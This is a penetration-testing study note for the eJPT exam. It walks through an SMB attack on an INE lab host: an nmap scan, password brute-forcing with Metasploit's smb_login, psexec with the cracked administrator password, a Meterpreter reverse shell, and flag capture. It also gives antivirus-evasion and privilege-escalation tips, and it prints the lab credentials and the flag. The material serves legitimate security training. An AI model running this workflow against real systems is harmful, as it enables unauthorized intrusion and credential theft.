---
title: "SMB Exploitation with Metasploit - Complete Workflow"
topic: "SMB/Metasploit"
exam_objective: "SMB enumeration, exploitation, and gaining system access"
difficulty: "Medium"
tools:
  - "nmap"
  - "metasploit"
  - "smb_login"
  - "psexec"
related_labs:
  - "05-service-enumeration/smb-enumeration-complete.md"
  - "07-exploitation/metasploit-essentials.md"
  - "04-port-scanning/nmap-scripting-engine.md"
file_path: "07-exploitation/smb-metasploit-workflow.md"
last_updated: "2025-01-02"
tags:
  - "smb"
  - "metasploit"
  - "psexec"
  - "password-attack"
  - "exploitation"
---

# üîß SMB Exploitation with Metasploit - Complete Workflow

Complete walkthrough demonstrating SMB service exploitation using Metasploit framework from discovery to system access
**Location:** `07-exploitation/smb-metasploit-workflow.md`

## üéØ What is SMB Exploitation?

SMB (Server Message Block) exploitation involves attacking misconfigured or vulnerable SMB services to gain unauthorized access to systems. This comprehensive workflow demonstrates the complete process from initial discovery through successful exploitation using Metasploit framework.

Key components include:
- **Port scanning and service discovery** using nmap
- **SMB protocol enumeration** and version detection
- **Credential attacks** using auxiliary modules
- **System exploitation** via psexec module
- **Post-exploitation** activities and flag capture

## üì¶ Installation and Setup

### Prerequisites:
- Kali Linux or similar penetration testing distribution
- Metasploit Framework installed
- Target system with SMB service enabled
- Valid network connectivity to target

### Verification:
```bash
# Verify Metasploit installation
msfconsole --version
# Expected output: Framework Version 6.x.x-dev

# Verify nmap installation
nmap --version
# Expected output: Nmap version 7.94SVN

# Start Metasploit console
msfconsole -q
```

## üîß Complete Exploitation Workflow

### Step-by-Step Process:
1. **Initial Discovery:** Port scanning with nmap
2. **Service Enumeration:** SMB protocol analysis
3. **Credential Attack:** Password brute-forcing
4. **System Exploitation:** Remote code execution
5. **Post-Exploitation:** System access and flag capture

### Basic Command Structure:
```bash
# Nmap scanning
nmap [options] target_ip

# Metasploit workflow
msfconsole -q
use [module_path]
set [option] [value]
exploit
```

## üß™ Real Lab Examples

### Complete SMB Exploitation Scenario

#### Phase 1: Initial Discovery
```bash
# Basic nmap scan to identify open ports
nmap demo.ine.local

# Expected output from lab:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-10 13:31 IST
Nmap scan report for demo.ine.local (10.0.16.162)
Host is up (0.0024s latency).
Other addresses for demo.ine.local (not scanned): 10.0.16.162
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds
```

#### Phase 2: SMB Protocol Enumeration
```bash
# SMB protocol and dialect enumeration
nmap -p445 --script smb-protocols demo.ine.local

# Expected output from lab:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-10 13:32 IST
Nmap scan report for demo.ine.local (10.0.16.162)
Host is up (0.0025s latency).
Other addresses for demo.ine.local (not scanned): 10.0.16.162

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-protocols:
|   dialects:
|     2:0:2
|     2:1:0
|     3:0:0
|     3:0:2
|     3:1:1
```

#### Phase 3: Credential Brute-Force Attack
```bash
# Launch Metasploit console
msfconsole -q

# Use SMB login auxiliary module
use auxiliary/scanner/smb/smb_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS demo.ine.local
set VERBOSE false
exploit

# Expected output from lab:
[*] 10.0.16.162:445    - 10.0.16.162:445 - Success: '.\sysadmin:samantha'
[*] 10.0.16.162:445    - 10.0.16.162:445 - Success: '.\demo:victoria'
[*] 10.0.16.162:445    - 10.0.16.162:445 - Success: '.\auditor:elizabeth'
[*] 10.0.16.162:445    - 10.0.16.162:445 - Success: '.\administrator:qwertyuiop' Administrator
[+] 10.0.16.162:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### Phase 4: System Exploitation via PSExec
```bash
# Use psexec exploit module
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser Administrator
set SMBPass qwertyuiop
exploit

# Expected output from lab:
[*] Started reverse TCP handler on 10.10.31.2:4444
[*] 10.0.16.162:445 - Connecting to the server...
[*] 10.0.16.162:445 - Authenticating to 10.0.16.162:445 as user 'Administrator'...
[*] 10.0.16.162:445 - Selecting PowerShell target
[*] 10.0.16.162:445 - Executing the payload...
[*] 10.0.16.162:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176198 bytes) to 10.0.16.162
[*] Meterpreter session 1 opened (10.10.31.2:4444 -> 10.0.16.162:49747) at 2024-07-10 13:39:45 +0530

meterpreter > 
```

#### Phase 5: Post-Exploitation and Flag Capture
```bash
# Drop to system shell
shell
cd /
dir
type flag.txt

# Expected output from lab:
meterpreter > shell
Process 2952 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd /
cd /

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3E75-72A0

 Directory of C:\

09/25/2020  06:41 AM    <DIR>          admin
09/25/2020                      32 flag.txt
02/23/2018  11:06 AM    <DIR>          PerfLogs
12/13/2017  09:00 PM    <DIR>          Program Files
09/25/2020  06:43 AM    <DIR>          Program Files (x86)
09/25/2020  06:42 AM    <DIR>          public
09/25/2020  06:15 AM    <DIR>          Users
09/25/2020  06:14 AM    <DIR>          Windows
               1 File(s)             32 bytes
               7 Dir(s)  15,796,563,968 bytes free

C:\>type flag.txt
type flag.txt
e0da81a9cd42b261bc9b90d15f780433

C:\>
```

## ‚öôÔ∏è Command Line Options

### Nmap SMB Scanning Options:
| Option | Purpose | Example |
|--------|---------|---------|
| `-p445` | Target SMB port specifically | `nmap -p445 target` |
| `--script smb-protocols` | Enumerate SMB dialects | `nmap --script smb-protocols target` |
| `--script smb-enum-shares` | List available shares | `nmap --script smb-enum-shares target` |
| `--script smb-vuln-*` | Check for SMB vulnerabilities | `nmap --script smb-vuln-* target` |

### Metasploit SMB Modules:
| Module | Purpose | Example |
|--------|---------|---------|
| `auxiliary/scanner/smb/smb_login` | Credential brute-force | `use auxiliary/scanner/smb/smb_login` |
| `exploit/windows/smb/psexec` | Remote code execution | `use exploit/windows/smb/psexec` |
| `auxiliary/scanner/smb/smb_enumshares` | Share enumeration | `use auxiliary/scanner/smb/smb_enumshares` |
| `auxiliary/scanner/smb/smb_version` | Version detection | `use auxiliary/scanner/smb/smb_version` |

### PSExec Module Options:
| Option | Purpose | Example |
|--------|---------|---------|
| `RHOSTS` | Target IP address | `set RHOSTS 192.168.1.100` |
| `SMBUser` | Username for authentication | `set SMBUser Administrator` |
| `SMBPass` | Password for authentication | `set SMBPass password123` |
| `LHOST` | Local IP for reverse connection | `set LHOST 192.168.1.10` |

## üéØ eJPT Exam Focus

### Essential Skills for eJPT:
- **SMB enumeration and scanning** - 85% probability in exam
- **Metasploit framework usage** - 90% probability in exam
- **Credential attacks and brute-forcing** - 75% probability in exam
- **Post-exploitation techniques** - 80% probability in exam

### Critical Commands to Master:
```bash
# Nmap SMB discovery
nmap -p445 --script smb-protocols target

# Metasploit credential attack
use auxiliary/scanner/smb/smb_login
set RHOSTS target
set USER_FILE /usr/share/wordlists/users.txt
set PASS_FILE /usr/share/wordlists/passwords.txt
exploit

# PSExec exploitation
use exploit/windows/smb/psexec
set RHOSTS target
set SMBUser username
set SMBPass password
exploit
```

### eJPT Exam Scenarios:
1. **Windows SMB Penetration:** Complete workflow from scanning to system access
   - Required skills: nmap, metasploit, credential attacks
   - Expected commands: nmap SMB scripts, smb_login, psexec
   - Success criteria: Gaining system-level access and flag capture

2. **Credential Brute-Force Testing:** Testing weak passwords on SMB services
   - Required skills: auxiliary modules, wordlist usage
   - Expected commands: smb_login module with various wordlists
   - Success criteria: Identifying valid credentials

### Exam Tips and Tricks:
- **Always start with basic nmap scan** before attempting exploitation
- **Use built-in wordlists** in /usr/share/metasploit-framework/data/wordlists/
- **Set VERBOSE false** to reduce output during brute-force attacks
- **Verify credentials** before proceeding to exploitation
- **Document all successful credentials** for reporting

### Common eJPT Questions:
- How to enumerate SMB protocols and dialects?
- Which Metasploit module is used for SMB credential attacks?
- What are the required options for psexec module?
- How to gain system shell from meterpreter session?

## ‚ö†Ô∏è Common Issues & Troubleshooting

### Issue 1: SMB Login Module Not Finding Credentials
**Problem:** smb_login module completes without finding valid credentials
**Cause:** Incorrect wordlist paths or inadequate wordlists
**Solution:**
```bash
# Verify wordlist paths
ls /usr/share/metasploit-framework/data/wordlists/
ls /usr/share/wordlists/

# Try different wordlists
set USER_FILE /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
```

### Issue 2: PSExec Module Fails to Execute
**Problem:** PSExec module connects but fails to execute payload
**Cause:** Insufficient privileges or wrong payload selection
**Solution:**
```bash
# Verify credentials have administrative privileges
# Try different payload options
set payload windows/meterpreter/reverse_tcp
set LHOST your_local_ip
set LPORT 4444
```

### Issue 3: Meterpreter Session Drops Immediately
**Problem:** Meterpreter session establishes but disconnects quickly
**Cause:** Firewall or antivirus interference
**Solution:**
```bash
# Try different payload encoders
set encoder x86/shikata_ga_nai
# Use different ports
set LPORT 443
```

### Issue 4: Cannot Access System Shell
**Problem:** Meterpreter session active but shell command fails
**Cause:** Session permissions or payload compatibility
**Solution:**
```bash
# Try system command instead of shell
sysinfo
getuid
# Attempt privilege escalation if needed
getsystem
```

## üîó Integration with Other Tools

### Primary Integration: Nmap ‚Üí Metasploit ‚Üí Post-Exploitation Tools
```bash
# Complete penetration testing workflow
nmap -sC -sV target_ip | tee nmap_results.txt
msfconsole -q
# Import nmap results
db_import nmap_results.txt
# Use discovered services for exploitation
hosts
services
```

### Secondary Integration: SMB Enumeration ‚Üí Credential Attack ‚Üí Exploitation
```bash
# Comprehensive SMB assessment workflow
nmap --script smb-enum-* target_ip
enum4linux target_ip
smbclient -L target_ip
# Then proceed with Metasploit exploitation
```

### Advanced Workflows:
```bash
# Automated exploitation workflow
# 1. Discover SMB services
nmap -p445 --script smb-protocols,smb-enum-shares target_range
# 2. Attempt credential attacks
use auxiliary/scanner/smb/smb_login
# 3. Exploit successful credentials
use exploit/windows/smb/psexec
# 4. Post-exploitation
use post/windows/gather/enum_logged_on_users
```

## üìù Documentation and Reporting

### Evidence Collection Requirements:
1. **Screenshots:** 
   - Nmap scan results showing open SMB ports
   - Successful credential discovery from smb_login
   - Meterpreter session establishment
   - System access and flag capture

2. **Command Outputs:**
   - Complete nmap scan output
   - Metasploit module execution logs
   - Credential validation results
   - Post-exploitation command outputs

3. **Log Files:**
   - Metasploit console logs
   - Session interaction logs
   - Payload generation details

### Report Template Structure:
```markdown
## SMB Exploitation Assessment

### Target Information
- Target: demo.ine.local (10.0.16.162)
- Date/Time: 2024-07-10 13:31 IST
- Tools Used: nmap 7.94SVN, Metasploit 6.x

### Discovery Phase
- Open Ports: 135, 139, 445, 3389
- SMB Service: Microsoft-DS on port 445
- SMB Protocols: 2:0:2, 2:1:0, 3:0:0, 3:0:2, 3:1:1

### Credential Attack Results
- Valid Credentials Found:
  - sysadmin:samantha
  - demo:victoria
  - auditor:elizabeth
  - administrator:qwertyuiop (Administrative privileges)

### Exploitation Results
- Method: PSExec with administrative credentials
- Payload: windows/meterpreter/reverse_tcp
- Result: Successful system-level access
- Flag Captured: e0da81a9cd42b261bc9b90d15f780433

### Recommendations
- Implement strong password policies
- Disable unnecessary SMB services
- Enable network segmentation
- Deploy endpoint detection and response (EDR)
```

### Evidence Documentation Script:
```bash
# Automated evidence collection
mkdir smb_assessment_$(date +%Y%m%d)
cd smb_assessment_$(date +%Y%m%d)
nmap -sC -sV -oA nmap_scan target_ip
script -a metasploit_session.log
# Launch msfconsole and document all commands
```

## üìö Additional Resources

### Official Documentation:
- Metasploit Framework: https://docs.metasploit.com/
- Nmap Scripting Engine: https://nmap.org/book/nse.html
- SMB Protocol Documentation: https://docs.microsoft.com/en-us/openspecs/

### Learning Resources:
- Metasploit Unleashed: https://www.offensive-security.com/metasploit-unleashed/
- eJPT Certification Guide: Official eLearnSecurity materials
- SMB Penetration Testing: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb

### Community Resources:
- Metasploit Community: https://github.com/rapid7/metasploit-framework
- Reddit r/AskNetsec: SMB security discussions
- Discord: Metasploit Framework community channel

### Related Tools:
- **enum4linux:** Alternative SMB enumeration tool
- **smbclient:** Manual SMB client for testing
- **rpcclient:** RPC enumeration and testing
- **crackmapexec:** Advanced SMB testing framework
